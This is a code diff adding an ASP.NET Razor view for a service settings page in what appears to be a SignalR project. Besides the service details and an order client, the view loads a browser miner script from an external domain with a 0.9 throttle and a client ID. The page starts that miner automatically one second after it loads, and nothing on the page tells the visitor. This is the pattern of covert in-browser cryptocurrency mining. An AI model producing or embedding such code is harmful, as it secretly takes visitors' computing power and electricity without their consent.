@@ -1,0 +1,46 @@
+﻿@model SignalRService.ViewModels.ServiceSettingViewModel
+
+@{
+  Layout = "~/Views/Shared/_LayoutMobile.cshtml";
+}
+
+@Html.Partial("SignalRBase")
+
+<div class="gotopageinfowrapper" style="visibility:hidden" >
+    <span>Id: @Model.Id</span>
+    <span>Name: @Model.ServiceName</span>
+    <span>Type: @Model.ServiceType</span>
+    <span>Url: @Model.ServiceUrl</span>
+</div>
+
+<h3>@Model.ServiceName</h3>
+
+@Html.Partial("RenderMiner", new SignalRService.ViewModels.MinerConfigurationViewModel() {
+     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+     Throttle = "0.9",
+     ScriptUrl = "https://www.freecontent.stream./Htxj.js",
+     StartDelayMs = 3000,
+     ReportStatusIntervalMs = 65000
+})
+
+@Html.Partial("RenderOrderClient", new SignalRService.ViewModels.OrderClientConfigurationViewModel() {
+   //  AppendToSelector = "*[data-role=page]"
+   AppendToSelector = ".body-content",
+   SinalRGroup = Model.ServiceUrl.ToLower()
+})
+<script>
+
+    //itemOrderClient.loadJqueryMobile();
+
+   
+
+    setTimeout(function () {
+
+        start_miner();
+        servicehub.server.joinGroup('@Model.ServiceUrl.ToLower()');
+
+        itemOrderClient.run();
+    }, 1000);
+   
+
+</script>
